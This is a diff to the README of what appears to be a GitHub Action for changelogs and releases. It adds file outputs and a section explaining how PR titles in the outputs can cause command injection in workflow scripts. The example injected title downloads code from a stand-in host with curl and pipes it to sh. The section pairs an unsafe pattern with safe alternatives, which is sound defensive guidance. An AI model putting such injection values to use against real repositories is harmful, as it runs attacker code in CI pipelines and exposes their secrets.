@@ -92,7 +92,7 @@ Before writing anything, the action checks that the version is a bare semantic v
 | `committer-name` | `github-actions[bot]` | |
 | `committer-email` | `41898282+github-actions[bot]@users.noreply.github.com` | |
 
-Outputs: `category`, `entry`, `commit-sha`.
+Outputs: `category`, `entry`, `entry-file` (path to a file with the entry), `commit-sha`. See [using the outputs safely](#using-the-outputs-safely).
 
 ### `release`
 
@@ -107,7 +107,36 @@ Outputs: `category`, `entry`, `commit-sha`.
 | `tag` | `true` | Create an annotated tag. |
 | `github-release` | `true` | Create a GitHub release. |
 
-Outputs: `version`, `notes`, `commit-sha`, `release-url`.
+Outputs: `version`, `notes`, `notes-file` (path to a file with the notes), `commit-sha`, `release-url`. See [using the outputs safely](#using-the-outputs-safely).
+
+## Using the outputs safely
+
+The `entry` and `notes` outputs contain PR titles, which anyone who opens a PR can choose. Treat them as untrusted input.
+
+Never put them in a `run:` script through an expression. GitHub pastes the text into the script before the shell runs, so a title like `x"; curl https://evil.example | sh; echo "` runs as a command:
+
+```yaml
+# Unsafe
+- run: echo "${{ steps.release.outputs.notes }}" | ./post-to-slack
+```
+
+Pass the value through an environment variable, so the shell treats it as data:
+
+```yaml
+- run: echo "$NOTES" | ./post-to-slack
+  env:
+    NOTES: ${{ steps.release.outputs.notes }}
+```
+
+Or use the file outputs, so the text never passes through an expression at all:
+
+```yaml
+- run: ./post-to-slack < "$NOTES_FILE"
+  env:
+    NOTES_FILE: ${{ steps.release.outputs.notes-file }}
+```
+
+The `update` action also replaces line breaks and control characters in PR titles with a space, so a title cannot add headings to the changelog or start a workflow command in the job log.
 
 ## Label mapping
 
